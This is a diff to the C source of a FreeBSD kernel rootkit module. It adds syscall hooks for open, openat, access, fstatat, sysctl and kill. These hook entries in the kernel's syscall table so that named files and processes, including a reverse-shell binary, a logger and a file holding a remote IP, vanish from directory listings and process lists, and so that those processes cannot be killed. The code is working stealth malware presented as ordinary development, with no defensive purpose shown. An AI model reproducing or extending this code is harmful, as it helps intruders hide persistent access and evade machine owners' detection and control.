@@ -12,6 +12,7 @@
 #include <sys/ucred.h>
 #include <sys/lock.h>
 #include <sys/mutex.h>
+#include <sys/user.h>
 #include <sys/condvar.h>
 #include <netinet/in.h>
 
@@ -29,6 +30,7 @@
 #include <sys/systm.h>
 #include <sys/dirent.h>
 #include <sys/syscall.h>
+#include <sys/fcntl.h>
 
 #include <sys/lock.h>
 #include <sys/mutex.h>
@@ -209,22 +211,32 @@ static int getdirentries_hook(struct thread *td, void *syscall_args) {
 
         count = size;
         struct dirent *curr_rec = d;
-        while (curr_rec->d_reclen != 0 && count > 0) {
-            count -= curr_rec->d_reclen;            
+        while (count > 0) {
+            size_t reclen = curr_rec->d_reclen;
+
+            if (reclen == 0 || reclen > count) {
+                free(d, M_TEMP);
+                return (EIO);
+            }
+
             // Add more module to hide here
-            if (is_hiding_path(curr_rec->d_name)) {
-                if (count != 0) {
-                    memmove((char *) curr_rec, 
-                        (char *) curr_rec + curr_rec->d_reclen, count);
-                }
-                size -= curr_rec->d_reclen;
+            if (is_hiding_path(curr_rec->d_name) || strcmp(curr_rec->d_name, "hiding.ko") == 0
+                || strcmp(curr_rec->d_name, "rootkit.ko") == 0
+                || strcmp(curr_rec->d_name, "rc.local") == 0
+                || strcmp(curr_rec->d_name, "rc.conf") == 0
+            ) {
+                size_t remaining = count - reclen;
+
+                memmove(curr_rec, (char *)curr_rec + reclen, remaining);
+                size -= reclen;
+                count -= reclen;
                 continue;
             }
 
-            if (count > 0) {
-                curr_rec = (struct dirent *) ((char *)curr_rec + curr_rec->d_reclen);
-            }
+            count -= reclen;
+            curr_rec = (struct dirent *)((char *)curr_rec + reclen);
         }
+
         td->td_retval[0] = size;
         copyout(d, uap->buf, size);
         free(d, M_TEMP);
@@ -233,16 +245,195 @@ static int getdirentries_hook(struct thread *td, void *syscall_args) {
     return error;
 }
 
-static int fstatat_hook(struct thread *td, struct fstatat_args *uap) {
+static sy_call_t *orig_fstatat = NULL;
+static sy_call_t *orig_openat = NULL;
+static sy_call_t *orig_open = NULL;
+static sy_call_t *orig_access = NULL;
+static sy_call_t *orig_sysctl = NULL;
+static sy_call_t *orig_kill = NULL;
+
+static const char *blocked_files[] = {
+    "/etc/rc.local",
+    "/etc/rc.conf",
+    "/etc/rc.d/kld",
+    "/boot/modules/rootkit.ko",
+    "/boot/modules/hiding.ko",
+    "/usr/local/bin/revshell",
+    "/usr/local/bin/rklog",
+    "/etc/rootkit_remote_ip",
+    NULL
+};
+
+static const char *blocked_processes[] = {
+    "kmod_remote_listen",
+    "rev_shell",
+    "rklog",
+    "hide_kld",
+    NULL
+};
+
+static int
+is_blocked_path(const char *user_path)
+{
+	char pathbuf[MAXPATHLEN];
+	size_t done;
+	int i;
+
+	if (user_path == NULL)
+		return (0);
+
+	if (copyinstr(user_path, pathbuf, sizeof(pathbuf), &done) != 0)
+		return (0);
+
+	for (i = 0; blocked_files[i] != NULL; i++) {
+		if (strcmp(pathbuf, blocked_files[i]) == 0)
+			return (1);
+	}
+
+	return (0);
+}
+
+static int is_blocked_process_name(const char *proc_name)
+{
+    int i;
+
+    if (proc_name == NULL)
+        return (0);
+
+    for (i = 0; blocked_processes[i] != NULL; i++) {
+        if (strcmp(proc_name, blocked_processes[i]) == 0)
+            return (1);
+    }
+
+    return (0);
+}
+
+static int is_blocked_process_pid(pid_t pid)
+{
+    struct proc *p;
+    int blocked = 0;
+
+    if (pid <= 0)
+        return (0);
+
+    p = pfind(pid);
+    if (p != NULL) {
+        if (p->p_state == PRS_NORMAL)
+            blocked = is_blocked_process_name(p->p_comm);
+        PROC_UNLOCK(p);
+    }
+
+    return (blocked);
+}
+
+static int
+fstatat_hook(struct thread *td, void *syscall_args)
+{
+	struct fstatat_args *uap = (struct fstatat_args *)syscall_args;
     char kpath[MAXPATHLEN];
     size_t done;
-    if (uap->path != NULL) {
-        int error = copyinstr(uap->path, kpath, MAXPATHLEN, &done);
-        if (!error && is_hiding_path(kpath) ) {
-            return ENOENT;
-        }
+    if (copyinstr(uap->path, kpath, sizeof(kpath), &done) != 0) {
+        return 0;
     }
-    return sys_fstatat(td, uap);
+	if (is_hiding_path(kpath))
+		return (ENOENT);
+
+	return (orig_fstatat(td, syscall_args));
+}
+
+static int
+openat_hook(struct thread *td, void *syscall_args)
+{
+	struct openat_args *uap = (struct openat_args *)syscall_args;
+
+	if (is_blocked_path(uap->path))
+		return (ENOENT);
+
+	return (orig_openat(td, syscall_args));
+}
+
+static int
+open_hook(struct thread *td, void *syscall_args)
+{
+	struct open_args *uap = (struct open_args *)syscall_args;
+
+	if (is_blocked_path(uap->path))
+		return (ENOENT);
+
+	return (orig_open(td, syscall_args));
+}
+
+static int access_hook(struct thread *td, void *syscall_args)
+{
+	struct access_args *uap = (struct access_args *)syscall_args;
+
+	if (is_blocked_path(uap->path))
+		return (ENOENT);
+
+	return (orig_access(td, syscall_args));
+}
+
+static int
+sysctl_hook(struct thread *td, void *syscall_args)
+{
+    struct __sysctl_args *uap = (struct __sysctl_args *)syscall_args;
+    int error;
+
+    error = orig_sysctl(td, syscall_args);
+    if (error != 0 || uap->old == NULL || uap->oldlenp == NULL || uap->namelen < 3) {
+        return (error);
+    }
+
+    int name[3];
+    if (copyin(uap->name, name, sizeof(name)) != 0) {
+        return (error);
+    }
+
+    if (name[0] == CTL_KERN && name[1] == KERN_PROC) {
+        size_t oldlen = 0;
+        if (copyin(uap->oldlenp, &oldlen, sizeof(oldlen)) != 0) {
+            return (error);
+        }
+
+        if (oldlen < sizeof(struct kinfo_proc) || oldlen > (64 * 1024 * 1024)) {
+            return (error);
+        }
+
+        struct kinfo_proc *procs = malloc(oldlen, M_TEMP, M_WAITOK);
+        if (copyin(uap->old, procs, oldlen) == 0) {
+            size_t count = oldlen / sizeof(struct kinfo_proc);
+            size_t write_idx = 0;
+
+            for (size_t read_idx = 0; read_idx < count; read_idx++) {
+                if (!is_blocked_process_name(procs[read_idx].ki_comm)) {
+                    if (write_idx != read_idx) {
+                        procs[write_idx] = procs[read_idx];
+                    }
+                    write_idx++;
+                }
+            }
+
+            if (write_idx < count) {
+                size_t newlen = write_idx * sizeof(struct kinfo_proc);
+                if (copyout(procs, uap->old, newlen) == 0) {
+                    copyout(&newlen, uap->oldlenp, sizeof(newlen));
+                }
+            }
+        }
+        free(procs, M_TEMP);
+    }
+
+    return (error);
+}
+
+static int kill_hook(struct thread *td, void *syscall_args)
+{
+    struct kill_args *uap = (struct kill_args *)syscall_args;
+
+    if (is_blocked_process_pid(uap->pid))
+        return (ESRCH);
+
+    return (orig_kill(td, syscall_args));
 }
 
 struct port_hiding_args {
@@ -319,7 +510,7 @@ static struct sysent kld_hiding_sysent = {
 };
 
 
-static int kld_hiding_offset = NO_SYSCALL;
+static int kld_hiding_offset = NO_SYSCALL;  
 
 struct proc_hiding_args {
     pid_t pid;
@@ -352,7 +543,7 @@ static int
 proc_hiding(struct thread *td, void *syscall_args) {
     struct proc_hiding_args *uap = (struct proc_hiding_args *) syscall_args;
     hide_process(uap->pid);
-    
+
     return 0;
 }
 
@@ -385,7 +576,24 @@ static int load(module_t module, int cmd, void *arg) {
         /* Initialize character device interface via interface.c */
         error = make_rootkit_dev();
         sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;
-        sysent[SYS_fstatat].sy_call = (sy_call_t *) fstatat_hook;
+
+        orig_fstatat = sysent[SYS_fstatat].sy_call;
+		sysent[SYS_fstatat].sy_call = (sy_call_t *)fstatat_hook;;
+
+		orig_openat = sysent[SYS_openat].sy_call;
+		sysent[SYS_openat].sy_call = (sy_call_t *)openat_hook;
+
+		orig_open = sysent[SYS_open].sy_call;
+		sysent[SYS_open].sy_call = (sy_call_t *)open_hook;
+
+		orig_access = sysent[SYS_access].sy_call;
+		sysent[SYS_access].sy_call = (sy_call_t *)access_hook;
+
+        orig_sysctl = sysent[SYS___sysctl].sy_call;
+        sysent[SYS___sysctl].sy_call = (sy_call_t *)sysctl_hook;
+
+        orig_kill = sysent[SYS_kill].sy_call;
+        sysent[SYS_kill].sy_call = (sy_call_t *)kill_hook;
 
         if (error == 0) {
             struct proc *p = NULL;
@@ -422,6 +630,30 @@ static int load(module_t module, int cmd, void *arg) {
         cv_destroy(&remote_cv);
         mtx_destroy(&remote_mtx);
         sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+
+        if (orig_fstatat != NULL) {
+			sysent[SYS_fstatat].sy_call = orig_fstatat;
+        }
+
+		if (orig_openat != NULL) {
+			sysent[SYS_openat].sy_call = orig_openat;
+		}
+
+		if (orig_open != NULL) {
+			sysent[SYS_open].sy_call = orig_open;
+		}
+
+		if (orig_access != NULL) {
+			sysent[SYS_access].sy_call = orig_access;
+		}
+
+        if (orig_sysctl != NULL) {
+            sysent[SYS___sysctl].sy_call = orig_sysctl;
+        }
+
+        if (orig_kill != NULL) {
+            sysent[SYS_kill].sy_call = orig_kill;
+        }
         printf("rootkit: module unloaded\n");
         break;
 
